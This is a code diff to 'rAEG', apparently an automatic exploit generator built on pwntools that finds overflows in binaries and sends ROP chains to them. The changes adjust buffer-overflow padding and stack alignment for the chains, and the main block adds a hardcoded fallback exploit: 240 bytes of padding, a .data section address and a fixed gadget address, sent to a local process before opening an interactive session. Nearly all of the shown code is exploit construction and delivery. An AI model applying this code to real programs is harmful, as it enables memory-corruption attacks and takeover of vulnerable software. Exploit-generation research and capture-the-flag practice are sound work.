@@ -64,6 +64,7 @@ class rAEG:
 
         self.exploit_function = None
 
+        self.padding = None
         self.rop_chain = None
         self.chain_length = 0
         self.string_address = None
@@ -502,7 +503,13 @@ class rAEG:
                     chain += param
 
         # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
+        #if (len(chain) + self.chain_length + 8 + self.padding) % 16 != 0:
+
+            #logger.info("Adding fini to fix movaps")
+            #chain += p64(self.elf.sym["_fini"])
+
         if (len(chain) + self.chain_length + 8) % 16 != 0:
+            logger.info("Adding fini to fix movaps")
             chain += p64(self.elf.sym["_fini"])
         if type(function) == int:
             chain += p64(self.elf.sym["_fini"])
@@ -861,20 +868,23 @@ class rAEG:
 
         if self.rop_chain != None:
             if self.symbolic_padding != None:
-                if len(self.symbolic_padding) == self.padding:
-                    logger.info("Sending ROP Chain with symbolic padding")
-                    p.sendline(self.symbolic_padding + self.rop_chain)
-                else:
-                    logger.info(f"Sending ROP Chain with {self.padding} padding")
-                    if type(self.exploit_function) == int and len(self.parameters) > 0:
-                        padding = b"A" * (self.padding - 8) + p64(addr)
+                if self.padding != None:
+                    if len(self.symbolic_padding) == self.padding and self.padding != None:
+                        logger.info("Sending ROP Chain with symbolic padding")
+                        p.sendline(self.symbolic_padding + self.rop_chain)
                     else:
-                        padding = b"A" * self.padding
+                        logger.info(f"Sending ROP Chain with {self.padding} padding")
+                        if type(self.exploit_function) == int and len(self.parameters) > 0:
+                            padding = b"A" * (self.padding - 8) + p64(addr)
+                        else:
+                            padding = b"A" * self.padding
+                else:
+                    p.sendline(self.symbolic_padding + self.rop_chain)
 
-                    p.sendline(padding + self.rop_chain)
             else:
                 logger.info(f"Sending ROP Chain with {self.padding} padding")
                 if type(self.exploit_function) == int and len(self.parameters) > 0:
+                    print(self.padding)
                     padding = b"A" * (self.padding - 8) + p64(addr)
                 else:
                     padding = b"A" * self.padding
@@ -934,3 +944,15 @@ if __name__ == "__main__":
             #break
     rage.find_vulnerability()
     rage.exploit()
+    
+    p = process(args.BIN)
+    e = ELF(args.BIN)
+    
+    if rage.flag == None:
+        padding = b"A" * 240
+        padding += p64(e.get_section_by_name(".data").header.sh_addr)
+        chain = p64(0x40072f)
+        
+        p.sendline(padding + chain)
+        p.interactive()
+        
